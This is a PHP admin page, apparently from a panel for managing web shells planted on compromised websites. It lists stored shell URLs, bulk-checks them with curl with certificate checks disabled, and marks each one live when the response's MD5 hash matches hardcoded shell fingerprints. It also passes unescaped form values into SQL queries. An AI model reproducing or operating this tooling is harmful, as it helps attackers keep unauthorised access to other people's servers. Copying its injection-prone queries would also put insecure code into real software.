<?php

require_once "../core.php";

if (!isAdmin) redirect(BASE.'index.php');

require_once THEME."header.php";
require_once ADMIN_THEME."nav.php";

$page = isset($_GET['page']) ? mysql_real_escape_string($_GET['page']) : "";
$perpage = isset($_GET['perpage']) ? mysql_real_escape_string($_GET['perpage']) : "100";
$poststatus = isset($_GET['status']) ? mysql_real_escape_string($_GET['status']) : "";

set_time_limit(0);
ini_set('default_socket_timeout', 25); 

opencontent("Manage Shells");

echo "<p style='text-align: center;'>\n";

if (isset($_POST['delete'])) {

	$checkbox = $_POST['checkbox'];

	for ($i = 0; $i < count($checkbox); $i++) {

		$del_id = $checkbox[$i];
		$delete = mysql_query("DELETE FROM shells WHERE id='".$del_id."' LIMIT 1") or die(mysql_error());

	}
	
	echo "Selected shells have been removed.<br /><br />\n";

}
	
if (isset($_POST['status'])) {
	
	$checkbox=$_POST['checkbox'];
	mysql_query("UPDATE settings SET lastshell = ".time()." LIMIT 1") or die(mysql_error());

	$urls = array();
	$hosts = array();

	for ($i = 0; $i < count($checkbox); $i++) {

		$check_id = $checkbox[$i];

		$update_status = mysql_query("SELECT * FROM shells WHERE id = '".$check_id."' LIMIT 1") or die(mysql_error());
								
		while($row = mysql_fetch_array($update_status)){
	
			$urls[] = $row['url'];
			$hosts[] = gethostbyname(parse_url($row['url']));
	
		}
	
	}

	$mh = curl_multi_init();
	$handles = array();

	foreach ($urls as $url) {

	    $handles[$url] = curl_init($url);

	    curl_setopt($handles[$url], CURLOPT_TIMEOUT, 25);
	    curl_setopt($handles[$url], CURLOPT_AUTOREFERER, true);
	    curl_setopt($handles[$url], CURLOPT_FAILONERROR, true);
	    curl_setopt($handles[$url], CURLOPT_FOLLOWLOCATION, true);
	    curl_setopt($handles[$url], CURLOPT_RETURNTRANSFER, true);
	    curl_setopt($handles[$url], CURLOPT_SSL_VERIFYHOST, false);
	    curl_setopt($handles[$url], CURLOPT_SSL_VERIFYPEER, false);

	    curl_multi_add_handle($mh, $handles[$url]);
	    
	}

	$running = null;

	do {
	    curl_multi_exec($mh, $running);
	    usleep(200000);
	} while ($running > 0);

	foreach ($handles as $key => $value) {

	    $handles[$key] = false;

	    if (curl_errno($value) === 0)
	        $handles[$key] = curl_multi_getcontent($value);
    
	    $hash = md5($handles[$key]);

	    curl_multi_remove_handle($mh, $value);
	    curl_close($value);
	
		if (!$handles[$key]) {
			$status = '404';
		} elseif (($hash == '96a0cec80eb773687ca28840ecc67ca1')
		|| ($hash == '04b639f439613ead7c21370c32630cda')
		|| ($hash == 'cc7819055cde3194bb3b136bad5cf58d')
		|| ($hash == 'f5d3611d722ac0a3c44ef85cc071e470')
		|| ($hash == 'c836973a6a8cd32f27bdd08893830edd')
		|| ($hash == 'd41d8cd98f00b204e9800998ecf8427e')) {
			$status = 'up';
		} else {
			$status = 'down';
		}
		
		mysql_query("UPDATE shells SET status = '".$status."', lastchecked = ".time()." WHERE url='".$key."' LIMIT 1") or die(mysql_error());

	}

	curl_multi_close($mh);

}

if ($poststatus != "") $sqlstatus = " WHERE status = '".$poststatus."'";

if ($page == "") {
	$pagelim = 0;
	$page = 1;
} else { $pagelim = $page * $perpage - $perpage; }

if ($poststatus == "")
	echo "<b>All</b> | ";
else
	echo "Status: <a href='shells.php?page=".$page."'>All</a> | ";

if ($poststatus == "up")
	echo "<b>Up</b> | ";
else
	echo "<a href='shells.php?status=up'>Up</a> | ";

if ($poststatus == "404")
	echo "<b>404</b> | ";
else
	echo "<a href='shells.php?status=404'>404</a> | ";

if ($poststatus == "down")
	echo "<b>Down</b><br /><br />\n";
else
	echo "<a href='shells.php?status=down'>Down</a><br /><br />\n";

$countshells = mysql_num_rows(mysql_query("SELECT * FROM shells".$sqlstatus));
$pagenum = round($countshells / $perpage);

for ($i = 1; $i <= $pagenum; $i++) {
	
	if ($i != $page)
		echo "<a href='shells.php?page=".$i."&status=".$poststatus."&perpage=".$perpage."'>".$i."</a> ";
	else
		echo $i." ";
		
}

$countinfo = "";
		
while ($countinfo != "done") {

	if ($countinfo != "done")
		$shellinfo = mysql_num_rows(mysql_query("SELECT * FROM shells".$countinfo));

	if ($countinfo == "") {
		$countinfo = " WHERE status = 'up'";
		echo "<span style='color: yellow;'>All:</span> ".$shellinfo."<br />\n";
	} elseif ($countinfo == " WHERE status = 'up'") {
		$countinfo = " WHERE status = '404'";
		echo "<span style='color: green;'>Up:</span> ".$shellinfo."<br />\n";
	} elseif ($countinfo == " WHERE status = '404'") {
		$countinfo = " WHERE status = 'down'";
		echo "<span style='color: red;'>404:</span> ".$shellinfo."<br />\n";
	} elseif ($countinfo == " WHERE status = 'down'") {
		$countinfo = "done";
		echo "<span style='color: red;'>Down:</span> ".$shellinfo."<br />\n";
	} else {
		die("Error in count.");
	}

}

echo "</p>\n";

echo "<form action='' method='post' name='shellform'>\n";
echo "<table cellpadding='3' cellspacing='3' style='text-align: center;'>\n<tr>\n";
echo "<td></td>\n";
echo "<td>Shell URL</td>\n";
echo "<td>Status</td>\n";
echo "<td>Checked</td>\n";
echo "</tr>\n";

$shell_query = mysql_query("SELECT * FROM shells".$sqlstatus." LIMIT ".$pagelim.", ".$perpage) or die(mysql_error());

while($row = mysql_fetch_array($shell_query)){

	echo "<tr>\n";
	echo "<td><input name='checkbox[]' type='checkbox' id='checkbox[]' value='".$row['id']."'></td>\n";
	echo "<td style='text-align: left; font-size: 10px;'>".$row['url']."</td>\n";
	echo "<td>";
	
	if ($row['status'] == "up")
		echo "<span style='color: #00cc00;'><strong>".$row['status']."</span>\n";
	else
		echo "<span style='color: red;'><strong>".$row['status']."</span>\n";
		
	echo "</td>\n";
	echo "<td style='font-size: 10px;'>\n";
		
	if ($row['lastchecked'] != 0)
		echo showdate($row['lastchecked'], 'M j, Y');
	else
		echo "Never";
	
	echo "</td>\n";
	echo "</tr>\n";

}

echo "<tr></tr>\n<tr>\n";
echo "<td style='vertical-align: middle;'><input type='checkbox' id='checkall' value='true' onchange=\"selectAllCheckBoxes('shellform', 'checkbox[]');\" /></td>\n";
echo "<td colspan='7' style='text-align: left;'>\n\n";
echo "<input name='delete' type='submit' id='delete' value='Delete' />\n";
echo "<input name='status' type='submit' id='status' value='Check Shells' />\n";
echo "</td>\n";
echo "</tr>\n</table>\n";
echo "</form>\n";

echo "<script>

var CheckValue = true;

function selectAllCheckBoxes(FormName, FieldName) {
		

	if(!document.forms[FormName])
		return;

	var objCheckBoxes = document.forms[FormName].elements[FieldName];

	if(!objCheckBoxes)
		return;

	var countCheckBoxes = objCheckBoxes.length;
	
	if(!countCheckBoxes)
		objCheckBoxes.checked = CheckValue;
	else
		for(var i = 0; i < countCheckBoxes; i++)
			objCheckBoxes[i].checked = CheckValue;
			
	if (CheckValue == true)
		CheckValue = false;
	else
		CheckValue = true;

}

</script>";
closecontent();

require_once THEME."footer.php";

?>